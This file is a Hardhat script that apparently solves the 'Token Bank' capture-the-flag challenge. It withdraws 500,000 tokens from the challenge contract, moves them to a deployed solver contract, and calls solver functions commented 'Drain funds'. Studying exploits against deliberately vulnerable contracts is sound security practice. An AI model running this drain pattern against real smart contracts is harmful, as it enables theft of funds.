const { ethers } = require('hardhat');

const DEPLOY = false;
const CHALLENGE_ADDRESS = '0x7A1a7dEF82495055fF0c01FEDdEE06d7Edd5be5c';
const SOLVER_ADDRESS = '0xEa03B81d4Ee1D613f2F0CEb667bcCb7c8EA454E4';

async function main() {
  const [owner] = await ethers.getSigners();

  const TokenBankChallenge = await ethers.getContractFactory('TokenBankChallenge');
  const contract = await TokenBankChallenge.attach(CHALLENGE_ADDRESS);

  const TokenBankChallengeSolver = await ethers.getContractFactory('TokenBankChallengeSolver');

  let solver;
  if (DEPLOY) {
    solver = await TokenBankChallengeSolver.deploy(contract.address);
    await solver.deployed();
    console.log(`Solver address: ${solver.address}`);
  } else {
    solver = await TokenBankChallengeSolver.attach(SOLVER_ADDRESS);
  }

  const amount = ethers.utils.parseEther('500000');

  // Move funds to the contract
  await contract.withdraw(amount);
  const tokenAddress = await contract.token();

  const abi = ['function transfer(address to, uint amount) returns (bool)'];
  const token = new ethers.Contract(tokenAddress, abi, owner);
  await token.transfer(solver.address, amount);

  // Drain funds
  await solver.transferTokens(amount);
  await solver.solveChallenge(amount);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
